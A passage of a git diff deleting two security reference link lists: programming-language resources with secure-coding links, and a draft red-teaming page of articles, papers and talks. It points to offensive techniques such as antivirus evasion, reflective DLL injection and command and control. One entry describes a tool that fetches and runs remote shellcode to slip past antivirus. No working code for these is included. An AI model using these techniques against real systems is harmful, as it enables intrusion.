-	* [aslrepl](https://github.com/enferex/asrepl)
-		* asrepl is an assembly based REPL. The REPL processes each line of user input, the output can be witnessed by issuing the command 'regs' and looking at the register state.
-
-
-----------
-### Android (Kotlin/Android Java)
-Android Java
-* [Kotlin - Wikipedia](https://en.wikipedia.org/wiki/Kotlin_(programming_language))
-* [Java - Wikipedia](https://en.wikipedia.org/wiki/Java_(programming_language))
-* Learn
-	* [Android Secure Coding Standard](https://www.securecoding.cert.org/confluence/display/android/Android+Secure+Coding+Standard)
-* Reference
-* Tools
-	* [java-aes-crypto (Android class)](https://github.com/tozny/java-aes-crypto)
-		* A simple Android class for encrypting & decrypting strings, aiming to avoid the classic mistakes that most such classes suffer from.
-	* [smalisca](https://github.com/dorneanu/smalisca)
-		* Static Code Analysis for Smali files 
-
-
-
-
-
-
-----------
-### Bash 
-Bash
-* [Bash - GNU](https://www.gnu.org/software/bash/)
-* [Bash (Unix shell) - Wikipedia](https://en.wikipedia.org/wiki/Bash_(Unix_shell))
-*  Learn
-	* [BASH Programming - Introduction HOW-TO - tldp](http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html)
-	* [Community Bash Style Guide](https://github.com/azet/community_bash_style_guide)
-	* [The Bash Guide - A quality-driven guide through the shell's many features.](https://guide.bash.academy)
-* Reference
-	* [Bash Reference Manual](https://tiswww.case.edu/php/chet/bash/bashref.html)
-	* [An A-Z Index of the Bash command line for Linux. - ss64](https://ss64.com/bash/)
-	* [bash(1) - Linux man page](https://linux.die.net/man/1/bash)
-* Tools
-* Scripts
-
-
-
-----------
-### <a name="c">C/C++</a>
-C/C++
-* [C (programming language) - Wikipedia](https://en.wikipedia.org/wiki/C_(programming_language))
-* [C++ - Wikipedia](https://en.wikipedia.org/wiki/C%2B%2B)
-* [C++ Homepage](https://isocpp.org/)
-* Learn
-	* [Stanford C 101](http://cslibrary.stanford.edu/101/EssentialC.pdf)
-		* Stanford CS Education Library: A 45 page summary of the C language. Explains all the common features and techniques for the C language. The coverage is pretty quick, so it is most appropriate for someone with some programming background who needs to see how C works. Topics include variables, int types, floating point types, promotion, truncation, operators, control structures (if, while, for), functions, value parameters, reference parameters, structs, pointers, arrays, the pre-processor, and the standard C library functions. (revised 4/2003) 
-		* [Homepage](http://cslibrary.stanford.edu/101/)
-	* [Stanford C Pointers and Memory](http://cslibrary.stanford.edu/102/PointersAndMemory.pdf)
-		* Stanford CS Education Library: a 31 page introduction to programming with pointers and memory in C, C++ and other languages. Explains how pointers and memory work and how to use them -- from the basic concepts through all the major programming techniques. Can be used as an introduction to pointers for someone with basic programming experience or as a quick review. Many advanced programming and debugging problems only make sense with a solid understanding of pointers and memory -- this document tries to provide that understanding. 
-	* [Homepage](http://cslibrary.stanford.edu/102/)
-	* [How to C in 2016](https://matt.sh/howto-c)
-	* [A critique of "How to C in 2016" by Matt](https://github.com/Keith-S-Thompson/how-to-c-response)
-	* [C Right-Left Rule](http://ieng9.ucsd.edu/~cs30x/rt_lt.rule.html)
-* Reference
-	* [C++ TutorialsPoint](https://www.tutorialspoint.com/cplusplus/)
-	* [C Function Call Conventions and the Stack](https://archive.is/o2nD5)
-	* [What a C programmer should know about memory](http://marek.vavrusa.com/c/memory/2015/02/20/memory/)
-	* [Cplusplus.com](http://www.cplusplus.com/)
-* Security
-	* [SEI CERT C Coding Standard](https://www.securecoding.cert.org/confluence/display/seccode/SEI+CERT+Coding+Standards)
-	* [SEI CERT C++ Coding Standard](https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=637)
-	* [Vulnerabilities in C : When integers go bad!](https://blog.feabhas.com/2014/10/vulnerabilities-in-c-when-integers-go-bad/)
-* Tools
-
-
-----------
-### <a name="c#"></a>C#
-* [Compiling C# Code at Runtime](https://www.codeproject.com/Tips/715891/Compiling-Csharp-Code-at-Runtime)
-
-
-
-
-----------
-### <a name="go">Go</a>
-Go
-* [Go Programming Language](https://golang.org/)
-* [GAS - Go AST Scanner](https://github.com/GoASTScanner/gas)
-	* Inspects source code for security problems by scanning the Go AST.
-
-
-
-
-----------
-### Java
-Java
-* [Java - Wikipedia](https://en.wikipedia.org/wiki/Java_(programming_language))
-* Learn
-	* [SEI CERT Oracle Coding Standard for Java](https://www.securecoding.cert.org/confluence/display/java/SEI+CERT+Oracle+Coding+Standard+for+Java)
-	* [Protect Your Java Code - Through Obfuscators and Beyond](https://www.excelsior-usa.com/articles/java-obfuscators.html)
-* Reference
-* Tools
-	* [Serianalyzer](https://github.com/mbechler/serianalyzer)
-		* A static byte code analyzer for Java deserialization gadget research
-	
-
-
-----------
-### Lisp
-Lisp
-* [Lisp - Wikipedia](https://en.wikipedia.org/wiki/Lisp_(programming_language))
-* [Common Lisp](https://common-lisp.net/)
-* [What makes lisp macros so special - StackOverflow](https://stackoverflow.com/questions/267862/what-makes-lisp-macros-so-special)
-* Learn
-	* [Lisp - TutorialsPoint](https://www.tutorialspoint.com/lisp/)
-* Reference
-* Tools
-* Other
-	[Lisp - Paul Graham](http://www.paulgraham.com/lisp.html)
-
-
-
---------------
-### <a name="net".NET</a>
-
-
-[Book of the Runtime (BOTR) for the .NET Runtime](https://github.com/dotnet/coreclr/tree/master/Documentation/botr)
-* This contains a collection of articles about the non-trivial internals of the .NET Runtime. Its intended audience are people actually modifying the code or simply wishing to have a deep understanding of the runtime.
-
-
-
------------
-### <a name="perl"Perl</a>
-Perl
-* [Perl Programming Language](https://www.perl.org/)
-* [Perl - Wikipedia](https://en.wikipedia.org/wiki/Perl)
-* Learn
-	* [Perl & Linguistics](http://world.std.com/~swmcd/steven/perl/linguistics.html)
-	* [SEI CERT Perl Coding Standard](https://www.securecoding.cert.org/confluence/display/perl/SEI+CERT+Perl+Coding+Standard)
-	* [Introduction to Perl](http://www.perl.com/pub/2000/10/begperl1.html)
-* Reference
-	* [Perl Docs](https://perldoc.perl.org/)
-* Tools
-
-
-
-
-
-
-
-
-
-----------
-### Lua
-Lua
-* [Lua](https://www.lua.org/)
-	* Official Homepage
-* [Lua - Getting Started](https://www.lua.org/start.html)
-* Learn
-	* [Learn X in Y minutes, Where X=Lua](https://learnxinyminutes.com/docs/lua/)
-	* [Lua code: security overview and practical approaches to static analysis](http://spw17.langsec.org/papers/costin-lua-static-analysis.pdf)
-		* Abstract — Lua is an interpreted, cross-platform, embeddable, performant and low-footprint language. Lua’s popularity is on the rise in the last couple of years. Simple design and efficient usage of resources combined with its performance make it attractive or production web applications even to big organizations such as Wikipedia, CloudFlare and GitHub. In addition to this, Lua is one of the preferred choices for programming embedded and IoT devices. This context allows to assume a large and growing Lua codebase yet to be assessed. This growing Lua codebase could be potentially driving production servers and extremely large number of devices, some perhaps with mission-critical function for example in automotive or home-automation domains. However, there is a substantial and obvious lack of static analysis tools and vulnerable code corpora for Lua as compared to other increasingly popular languages, such as PHP, Python and JavaScript. Even the state-of-the-art commercial tools that support dozens of languages and technologies actually do not support Lua static code analysis. In this paper we present the first public Static Analysis for SecurityTesting (SAST) tool for Lua code that is currently focused on web vulnerabilities. We show its potential with good and promising preliminary results that we obtained on simple and intentionally vulnerable Lua code samples that we synthesized for our experiments. We also present and release our synthesized corpus of intentionally vulnerable Lua code, as well as the testing setups used in our experiments in form of virtual and completely reproducible environments. We hope our work can spark additional and renewed interest in this apparently overlooked area of language security and static analysis, as well as motivate community’s contribution to these open-source projects. The tool, the samples and the testing VM setups will be released and updated at http://lua.re and http://lua.rocks
-* Tools
-	* [REPL.lua](https://github.com/hoelzro/lua-repl)
-		* a reusable Lua REPL written in Lua, and an alternative to /usr/bin/lua
-
-
-----------
-### .NET
-
-[.NET serialiception](https://blog.scrt.ch/2016/05/12/net-serialiception/)
-
-[.Net The Managed Heap and Garbage Collection in the CLR](https://www.microsoftpressstore.com/articles/article.aspx?p=2224054)
-
-
-
-
-
-
-
-
-----------
-### <a name="power">Powershell</a>
-
-
-
-#### Learn
-
-[Learn Windows PowerShell in a Month of Lunches, Third Edition - Book](https://www.manning.com/books/learn-windows-powershell-in-a-month-of-lunches-third-edition)
-
-[learning-powershell/ - github repo](https://github.com/PowerShell/PowerShell/tree/master/docs/learning-powershell)
-
-[Getting Started with Microsoft PowerShell - MS Virtual Academy](https://mva.microsoft.com/en-us/training-courses/getting-started-with-microsoft-powershell-8276?l=r54IrOWy_2304984382)
-
-[Weekend Scripter: The Best Ways to Learn PowerShell - technet](https://blogs.technet.microsoft.com/heyscriptingguy/2015/01/04/weekend-scripter-the-best-ways-to-learn-powershell/)
-
-[Powershell Tutorial Online](http://powershelltutorial.net/)
-
-[Dirty Powershell Webserver](http://obscuresecurity.blogspot.com/2014/05/dirty-powershell-webserver.html)
-
-[Useful Powershell scripts](https://github.com/clymb3r/PowerShell)
-
-
-#### Reference
-
-#### Tools
-[Pester](https://github.com/pester/Pester)
-* Pester provides a framework for running unit tests to execute and validate PowerShell commands from within PowerShell. Pester consists of a simple set of functions that expose a testing domain-specific language (DSL) for isolating, running, evaluating and reporting the results of PowerShell commands.
-
-#### Other
-'''
-Try/Catch Exception in Powershell
-
-try {
-#stuff
-} catch {
-$ErrorMessage = $_.Exception.Message
-$ErrorSource = $_.Exception.Source
-$err = $ErrorSource + " reports: " + $ErrorMessage
-}
-
-'''
-
-
-----------
-### PHP
-PHP
-* [awesome-php](https://github.com/ziadoz/awesome-php)
-	* A curated list of amazingly awesome PHP libraries, resources and shiny things.
-* Documentation
-	* [PHP Documentation](https://secure.php.net/docs.php)
-* Educational
-	* [PHP: a fractal of bad design](https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/)
-	* [Reference — What does this symbol mean in PHP?](https://stackoverflow.com/questions/3737139/reference-what-does-this-symbol-mean-in-php)
-* Tools
-	* [Static analysis tools for PHP](https://github.com/exakat/php-static-analysis-tools)
-	* A reviewed list of useful PHP static analysis tools
-
-
-
-
-
-
-
-
-
-
-
-----------
-### <a name="python">Python</a>
-Python
-[Python 3.6.2 documentation](https://docs.python.org/3/)
-
-[Python 2.7 documentation](https://docs.python.org/2.7/)
-* Learn
-	* [Learn Python the Hard Way](http://learnpythonthehardway.org/book/)
-	* [Python For Beginners]()
-		* Welcome! Are you completely new to programming? If not then we presume you will be looking for information about why and how to get started with Python. Fortunately an experienced programmer in any programming language (whatever it may be) can pick up Python very quickly. It's also easy for beginners to use and learn, so jump in!
-	* [Obfuscating python](https://reverseengineering.stackexchange.com/questions/1943/what-are-the-techniques-and-tools-to-obfuscate-python-programs)
-	* [Understanding Python Bytecode](http://security.coverity.com/blog/2014/Nov/understanding-python-bytecode.html)
-	* [Reverse debugging for Python](https://morepypy.blogspot.com/2016/07/reverse-debugging-for-python.html?m=1)
-	* [Python in a hacker's toolbox (PyConPl'15)](http://gynvael.coldwind.pl/?lang=en&id=572)
-	* [Diving deep into Python – the not-so-obvious language parts](http://sebastianraschka.com/Articles/2014_deep_python.html)
-	* [PEP: 551 Title: Security transparency in the Python runtime Version](https://github.com/python/peps/blob/cd795ec53c939e5b40808bb9d7a80c428c85dd52/pep-0551.rst)
-	* [Build an API under 30 lines of code with Python and Flask](https://impythonist.wordpress.com/2015/07/12/build-an-api-under-30-lines-of-code-with-python-and-flask/)
-	* [Diving deep into Python – the not-so-obvious language parts](http://sebastianraschka.com/Articles/2014_deep_python.html)
-	* [Virtualenv](https://virtualenv.pypa.io/en/latest/userguide/)
-		* [Python Static Analysis - Spencer J McIntyre - Derbycon7](https://www.youtube.com/watch?v=hWIiyOV4Wbk&index=45&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
-			* Python is a popular language and that is true as well within the Security industry. This talk will outline how Python code can be statically analyzed using publicly available tools such as bandit. It will then take a more technical approach and outline how the abstract syntax tree (AST) can be processed and searched based on behavior clues to identify potential security issues. Many security tools search for vulnerabilities by analyzing the contents of static strings and examining their variable names. This alternative approach instead demonstrates how the AST can be analyzed to identify pieces of sensitive information such as encryption keys and passwords based on matching them with usage patterns. This will be a technical talk focused on using automated techniques to find security vulnerabilities in Python projects. The audience will leave with an understanding of these techniques and how they can be applied to the projects they are either developing themselves or using in their daily routines. This talk will end with a live demonstration of a forked version of the public Bandit scanner where these techniques have been implemented. 
-	* [Python Static Analysis Spencer J McIntyre - Derbycon7](https://www.youtube.com/watch?v=hWIiyOV4Wbk&index=45&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
-* Reference
-	* [The Hitchhiker’s Guide to Python!](http://docs.python-guide.org/en/latest/)
-* Libraries
-	* [Python Library for interacting with Serial Ports](http://pyserial.sourceforge.net/)
-	* [Hachoir](https://bitbucket.org/haypo/hachoir/wiki/Home)
-		* Hachoir is a Python library that allows to view and edit a binary stream field by field
-	* [Equip: python bytecode instrumentation](https://github.com/neuroo/equip)
-		* equip is a small library that helps with Python bytecode instrumentation. Its API is designed to be small and flexible to enable a wide range of possible instrumentations. The instrumentation is designed around the injection of bytecode inside the bytecode of the program to be instrumented. However, the developer does not need to know anything about the Python bytecode since the injected code is Python source.
-	* [Construct2](https://github.com/construct/construct)
-		* Construct is a powerful declarative parser (and builder) for binary data.  Instead of writing imperative code to parse a piece of data, you declaratively define a data structure that describes your data. As this data structure is not code, you can use it in one direction to parse data into Pythonic objects, and in the other direction, convert ("build") objects into binary data.
-	* [Impacket](https://github.com/CoreSecurity/impacket)
-		* Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (for instance NMB, SMB1-3 and MS-DCERPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.
-	* [Trollius and asyncio](https://trollius.readthedocs.io/asyncio.html)
-
-
-----------
-### <a name="ruby">Ruby</a>
-[Ruby Homepage](https://www.ruby-lang.org/en/)
-
-[Official Ruby Docs](https://ruby-doc.org/)
-
-[Ruby Gems](https://rubygems.org/)
-
-#### Learn
-[Ruby - Tutorials Point](http://www.tutorialspoint.com/ruby/)
-
-[Ruby in 20 Minutes](https://www.ruby-lang.org/en/documentation/quickstart/)
-
-[rb2exe](https://github.com/loureirorg/rb2exe)
-* Ruby to EXE - Turn ruby scripts into portable executable apps
-
-
-### Useful Libraries/programs/Frameworks
-
-[Shellpaste](https://github.com/andrew-morris/shellpaste)
-* Tiny snippet of code that pulls ASCII shellcode from pastebin and executes it. The purpose of this is to have a minimal amount of benign code so AV doesn't freak out, then it pulls down the evil stuff. People have been doing this kind of stuff for years so I take no credit for the concept. That being said, this code (or similar code) works surprisingly often during pentests when conventional malware fails. 
-
-[Ruby on Rails](http://rubyonrails.org/)
-
-
-
-----------
-### SQL
-* 
-[SafeSQL](https://github.com/stripe/safesql)
-* SafeSQL is a static analysis tool for Go that protects against SQL injections.
-
-
-
-----------
-### UEFI Programming
-
-[Unified Extensible Firmware Interface Forum](http://www.uefi.org/)
-
-[Unified Extensible Firmware Interface](https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface)
-
-
-
-#### Learn
-
-[Programming for EFI: Creating a "Hello, World" Program](http://www.rodsbooks.com/efi-programming/hello.html)
-
-[UEFI Programming - First Steps](http://x86asm.net/articles/uefi-programming-first-steps/)
-
-[Getting started with UEFI application development](https://lihashgnis.blogspot.com/2016/08/getting-started-with-uefi-application.html)
-
-[Getting started with UEFI Development](https://lihashgnis.blogspot.com/2016/08/getting-started-with-uefi-application.html)
-
-
-#### Reference
-
-[UEFI - OSDev](http://wiki.osdev.org/UEFI)
-
-
-
-#### Talks & Presentations
-[Simple Made Easy](https://www.infoq.com/presentations/Simple-Made-Easy)
-*  Rich Hickey emphasizes simplicity’s virtues over easiness’, showing that while many choose easiness they may end up with complexity, and the better way is to choose easiness along the simplicity path.
-
-
-
-
-### Other
-
-[A successful Git branching model](http://nvie.com/posts/a-successful-git-branching-model/)
-
-[Mostly Adequate Guide](https://drboolean.gitbooks.io/mostly-adequate-guide/)
-* This is a book on the functional paradigm in general. We'll use the world's most popular functional programming language: JavaScript. Some may feel this is a poor choice as it's against the grain of the current culture which, at the moment, feels predominately imperative.
-
-[Reflective DLL Injection](http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf)
-
-[Porting Windows Dynamic Link Libraries to Linux](https://github.com/taviso/loadlibrary)
diff --git a/Draft/Red-Teaming.md b/Draft/Red-Teaming.md
deleted file mode 100644
index 0b0d2ba..0000000
--- a/Draft/Red-Teaming.md
+++ /dev/null
@@ -1,439 +0,0 @@
-# Red Teaming/Adversary Simulation/Explicitly Pen testing stuff
-
-
-
-#### ToC
-* [General](#general](#general)
-* [Talks/Videos](#talks)
-* [Articles/Blogposts](#articles)
-* [Papers](#papers)
-* [Tools](#tools)
-* [HW](#hw)
-* [SW](#sw)
-* [Command and Control](#cnc)
-* [Domain Fronting](#front)
-* [Egress](#egress)
-* [Domain Reputation Checking](#check)
-
-### Sort
-To Do
-* Sort articles better
-* [PenTesting-Scripts - killswitch-GUI](https://github.com/killswitch-GUI/PenTesting-Scripts)
-* [Software Distribution Malware Infection Vector](https://dl.packetstormsecurity.net/papers/general/Software.Distribution.Malware.Infection.Vector.pdf)
-* [File Server Triage on Red Team Engagements](http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/)
-#### End sort
-
-
-
-
---------------
-### <a name="general"></a>General
-* General
-	* [Red Team - Wikipedia](https://en.m.wikipedia.org/wiki/Red_team)
-	* [Common Ground Part 1: Red Team History & Overview](https://www.sixdub.net/?p=705)
-	* [Red Team Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
-		* Wiki to collect Red Team infrastructure hardening resources
-		* Accompanying Presentation: [Doomsday Preppers: Fortifying Your Red Team Infrastructure](https://speakerdeck.com/rvrsh3ll/doomsday-preppers-fortifying-your-red-team-infrastructure)
-	* [Target Analysis - Wikipedia](https://en.wikipedia.org/wiki/Target_analysis)
-	* [Center of Gravity Analysis - Dale C. Eikmeier](http://www.au.af.mil/au/awc/awcgate/milreview/eikmeier.pdf)
-		* Center of Gravity: A system's source of power to act.
-	* [A Tradecraft Primer: Structured Analytic Techniques for Improving Intelligence Analysis - USGov 2009](https://www.cia.gov/library/center-for-the-study-of-intelligence/csi-publications/books-and-monographs/Tradecraft%20Primer-apr09.pdf)
-	* [Advanced Threat Tactics – Course and Notes - CobaltStrike](https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/)
-Articles
-	* [Fools of Golden Gate](https://blog.silentsignal.eu/2017/05/08/fools-of-golden-gate/)
-		* How major vulnerabilities/large amounts of publicly vulnerable systems can exist without public recognition for long periods of time. (i.e. CVEs(10.0) exist, but no mapping in nessus/metasploit/etc)
-	* [Red Teaming and the Adversarial Mindset: Have a Plan, Backup Plan and Escape Plan - ITS](https://www.itstactical.com/digicom/security/red-teaming-and-the-adversarial-mindset-have-a-plan-backup-plan-and-escape-plan/)
-	* [Raphael’s Magic Quadrant - Mudge](https://blog.cobaltstrike.com/2015/08/03/raphaels-magic-quadrant/)
-	* [RAT - Repurposing Adversarial Tradecraft - killswitch_GUI](https://speakerdeck.com/killswitch_gui/rat-repurposing-adversarial-tradecraft)
-	* [Penetration Testing considered Harmful Today](http://blog.thinkst.com/p/penetration-testing-considered-harmful.html)
-	* [Planning a Red Team exercise](https://github.com/magoo/redteam-plan)
-* Educational(Specific Tactics/Techniques/Misc)
-	* [#OLEOutlook - bypass almost every Corporate security control with a point’n’click GUI](https://doublepulsar.com/oleoutlook-bypass-almost-every-corporate-security-control-with-a-point-n-click-gui-37f4cbc107d0)
-	* [Offensive Encrypted Data Storage](http://www.harmj0y.net/blog/redteaming/offensive-encrypted-data-storage/)
-	* [Offensive Encrypted Data Storage (DPAPI edition)](https://posts.specterops.io/offensive-encrypted-data-storage-dpapi-edition-adda90e212ab)
-	* [Goodbye OODA Loop](http://armedforcesjournal.com/goodbye-ooda-loop/)
-	* [Planning a Red Team exercise](https://github.com/magoo/redteam-plan)
-* Red Team Experiences
-	* [Passing the Torch: Old School Red Teaming, New School Tactics?](https://www.slideshare.net/harmj0y/derbycon-passing-the-torch)
-	* [Red Teaming Tips - Vincent Yiu](https://threatintel.eu/2017/06/03/red-teaming-tips-by-vincent-yiu/)
-	* [Red Team Tips as posted by @vysecurity on Twitter](https://github.com/vysec/RedTips)
-	* [Red Teams - Facebook Experiences Writeup - Ryan McGeehan](https://medium.com/starting-up-security/red-teams-6faa8d95f602)
-	* [Reflections from a Red Team Leader - Susan Craig](http://usacac.army.mil/CAC2/MilitaryReview/Archives/English/MilitaryReview_20070430_art011.pdf)
-	* [Red Teaming: Using Cutting-Edge Threat Simulation to Harden the Microsoft Enterprise Cloud](https://azure.microsoft.com/en-us/blog/red-teaming-using-cutting-edge-threat-simulation-to-harden-the-microsoft-enterprise-cloud/)
-	* [10 Red Teaming Lessons Learned over 20 Years](https://redteamjournal.com/2015/10/10-red-teaming-lessons-learned-over-20-years/)
-	* [Red team versus blue team: How to run an effective simulation - CSOonline](https://www.csoonline.com/article/2122440/disaster-recovery/emergency-preparedness-red-team-versus-blue-team-how-to-run-an-effective-simulation.html)
-	* [Red Teaming for Pacific Rim CCDC 2017](https://bluescreenofjeff.com/2017-05-02-red-teaming-for-pacific-rim-ccdc-2017/)
-	* [How I Prepared to Red Team at PRCCDC 2015](https://bluescreenofjeff.com/2015-04-15-how-i-prepared-to-red-team-at-prccdc-2015/)
-	* [Red Teaming for Pacific Rim CCDC 2016](https://bluescreenofjeff.com/2016-05-24-pacific-rim-ccdc_2016/)
-* Papers
-	* [Red teaming - A Short Introduction (1.0) June 2009 - Mark Mateski](https://redteamjournal.com/papers/A%20Short%20Introduction%20to%20Red%20Teaming%20(1dot0).pdf)
-	* [Red Teaming Guide - UK Ministry of Defense](https://www.gov.uk/government/uploads/system/uploads/attachment_data/file/142533/20130301_red_teaming_ed2.pdf)
-	* [Red Team Handbook(2012) - University of Foreign Military And Cultural studies](http://www.au.af.mil/au/awc/awcgate/army/ufmcs_red_team_handbook_apr2012.pdf)
-	* [Red Teaming of Advanced Information Assurance Concepts - Bradley Wood, Ruth Duggan](http://cs.uccs.edu/~gsc/pub/master/sjelinek/doc/research/red.pdf)
-	* [A Guide To Red Teaming - NATO](http://www.act.nato.int/images/stories/events/2011/cde/rr_ukdcdc.pdf)
-	* [Modeling and Simulation of Red Teaming - Part 1: Why Red Team M&S? - Michael J Skroch](https://redteamjournal.com/wp-content/uploads/2009/12/msrt0.3-2nov2009-sand2009-7215J.pdf)
-	* [Moving Forward with Computational Red Teaming - Scott Wheeler - Australian DoD](http://www.dtic.mil/dtic/tr/fulltext/u2/a569437.pdf)
-	* [Cyber Red Teaming  Organisational, technical and legal implications in a military context - NATO](https://ccdcoe.org/sites/default/files/multimedia/pdf/Cyber_Red_Team.pdf)
-	* [Traditions In Military-Strategic Thought In Germany And The Problem Of Deterrence - 1989 - Detlef Bald](http://www.mgfa.de/html/einsatzunterstuetzung/downloads/ap018englisch.pdf?PHPSESSID=931748af0e86616800373655acaf2902)
-	* [Force Protection and Suicide Bombers: The Necessity for Two Types of Canadian Military Red Teams](http://www.journal.forces.gc.ca/vol12/no4/page35-eng.asp)
-	* [The Applied Critical Thinking Handbook(2015) - University of Foreign Military And Cultural studies](http://usacac.army.mil/sites/default/files/documents/ufmcs/The_Applied_Critical_Thinking_Handbook_v7.0.pdf)
-	* [Preparing for the War of the Future in the Wake of Defeat: The Evolution of German Strategic Thought, 1919 - 1935 - Mark Shannon](https://www.ciaonet.org/attachments/25573/uploads)
-	* [Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains](https://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf)		
-	* [Ananalysis of the Metasploit Framework relative to the Penetration Testing Execution Standard(PTES) guidance(2011) - Brandon Perry](http://www.nothink.org/metasploit/documentation/metasploit_msf_analysis_ptes.pdf)
-
-
-
-
-
-
-
---------------
-### <a name="talks"></a>Talks/Videos
-Talks/Videos
-* [Hacks Lies Nation States - Mario DiNatale](https://www.youtube.com/watch?v=nyh_ORq1Qwk)
-* [The Impact of Dark Knowledge and Secrets on Security and Intelligence Professionals - Richard Thieme](https://www.youtube.com/watch?v=0MzcPBAj88A&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe)
-	* Dismissing or laughing off concerns about what it does to a person to know critical secrets does not lessen the impact on life, work, and relationships of building a different map of reality than “normal people” use. One has to calibrate narratives to what another believes. One has to live defensively, warily. This causes at the least cognitive dissonance which some manage by denial. But refusing to feel the pain does not make it go away. It just intensifies the consequences when they erupt. Philip K. Dick said, reality is that which, when you no longer believe in it, does not go away. When cognitive dissonance evolves into symptoms of traumatic stress, one ignores those symptoms at one’s peril. But the very constraints of one’s work often make it impossible to speak aloud about those symptoms, because that might threaten one’s clearances, work, and career. And whistle blower protection is often non-existent.
-* Educational
-	* [Finding Diamonds in the Rough- Parsing for Pentesters](https://bluescreenofjeff.com/2016-07-26-finding-diamonds-in-the-rough-parsing-for-pentesters/)
-	* [Hillbilly Storytime - Pentest Fails - Adam Compton](https://www.youtube.com/watch?v=GSbKeTPv2TU)
-		* Whether or not you are just starting in InfoSec, it is always important to remember that mistakes happen, even to the best and most seasoned of analysts. The key is to learn from your mistakes and keep going. So, if you have a few minutes and want to talk a load off for a bit, come and join in as a hillbilly spins a yarn about a group unfortunate pentesters and their misadventures. All stories and events are true (but the names have been be changed to prevent embarrassment).
-	* [Building A Successful Internal Adversarial Simulation Team - C. Gates & C. Nickerson - BruCON 0x08](https://www.youtube.com/watch?v=Q5Fu6AvXi_A&list=PLtb1FJdVWjUfCe1Vcj67PG5Px8u1VY3YD&index=1)
-* Recon
-	* [Full Contact Recon int0x80 of Dual Core savant - Derbycon7](https://www.youtube.com/watch?v=XBqmvpzrNfs)
-* Tactics
-	* [Stupid RedTeamer Tricks - Laurent Desaulniers](https://www.youtube.com/watch?v=2g_8oHM0nwA&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=11)
-	* [Abusing Webhooks for Command and Control - Dimitry Snezhkov](https://www.youtube.com/watch?v=1d3QCA2cR8o&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=12)
-	* [Looping Surveillance Cameras through Live Editing - Van Albert and Banks - Defcon23](https://www.youtube.com/watch?v=RoOqznZUClI)
-		* This project consists of the hardware and software necessary to hijack wired network communications. The hardware allows an attacker to splice into live network cabling without ever breaking the physical connection. This allows the traffic on the line to be passively tapped and examined. Once the attacker has gained enough knowledge about the data being sent, the device switches to an active tap topology, where data in both directions can be modified on the fly. Through our custom implementation of the network stack, we can accurately mimic the two devices across almost all OSI layers. We have developed several applications for this technology. Most notable is the editing of live video streams to produce a “camera loop,” that is, hijacking the feed from an Ethernet surveillance camera so that the same footage repeats over and over again. More advanced video transformations can be applied if necessary. This attack can be executed and activated with practically no interruption in service, and when deactivated, is completely transparent.
-	* [Sniffing Sunlight - Erik Kamerling - ANYCON2017](http://www.irongeek.com/i.php?page=videos/anycon2017/102-sniffing-sunlight-erik-kamerling)
-		* Laser listening devices (laser microphones) are a well understood technology. They have historically been used in the surreptitious surveillance of protected spaces. Using such a device, an attacker bounces an infrared laser off of a reflective surface, and receives the ricocheted beam with a photoreceptor. If the beam is reflected from a surface that is vibrating due to sound (voice is a typical background target), that sound is subsequently modulated into the beam and can be demodulated at the receptor. This is a known attack method and will be briefly discussed. However, does this principle also hold for non-amplified or naturally concentrated light sources? Can one retrieve modulated audio from reflected sunlight? The idea of modulating voice with sunlight was pioneered by Alexander Graham Bell in 1880 with an invention called the Photophone. A Photophone uses the audio modulation concept now used in laser microphones, but relied on a concentrated beam of sunlight rather than a laser to communicate at distance. Considering that Bell proved that intentionally concentrated sunlight can be used to modulate voice, we will explore under what natural conditions modulated audio can be found in reflected ambient light. Using off the shelf solar-cells and handmade amplifiers, Erik will demonstrate the use of the receiver side of a historic Photophone to identify instances of modulated audio in reflected light under common conditions.
-	* [Red Teaming Back and Forth 5ever Fuzzynop - Derbycon4](https://www.youtube.com/watch?v=FTiBwFJQg64)
-	* [Advanced Red Teaming: All Your Badges Are Belong To Us - DEF CON 22 - Eric Smith and Josh Perrymon](https://www.youtube.com/watch?v=EEGxifOAk48)
-	* [Operating in the Shadows Carlos Perez - Derbycon5](https://www.youtube.com/watch?v=NXTr4bomAxk)
-	* [Building a Better Moat: Designing an Effective Covert Red Team Attack Infrastructure - @bluescreenofjeff](https://speakerdeck.com/bluscreenofjeff/building-a-better-moat-designing-an-effective-covert-red-team-attack-infrastructure)
-	* [88MPH Digital tricks to bypass Physical security - ZaCon4 - Andrew MacPherson](https://vimeo.com/52865794)
-	* [A  Year In The Red by Dominic Chell and Vincent Yiu - BSides Manchester2017](https://www.youtube.com/watch?v=-FQgWGktYtw&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP&index=23)
-	* [Attacking EvilCorp: Anatomy of a Corporate Hack](http://www.irongeek.com/i.php?page=videos/derbycon6/111-attacking-evilcorp-anatomy-of-a-corporate-hack-sean-metcalf-will-schroeder)
-	* [Detect Me If You Can Ben Ten - Derbycon7](https://www.youtube.com/watch?v=AF3arWoKfKg&index=23&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
-	* [Modern Evasion Techniques Jason Lang - Derbycon7](https://www.irongeek.com/i.php?page=videos/derbycon7/t110-modern-evasion-techniques-jason-lang)
-		* As pentesters, we are often in need of working around security controls. In this talk, we will reveal ways that we bypass in-line network defenses, spam filters (in line and cloud based), as well as current endpoint solutions. Some techniques are old, some are new, but all work in helping to get a foothold established. Defenders: might want to come to this one.
-* Phishing
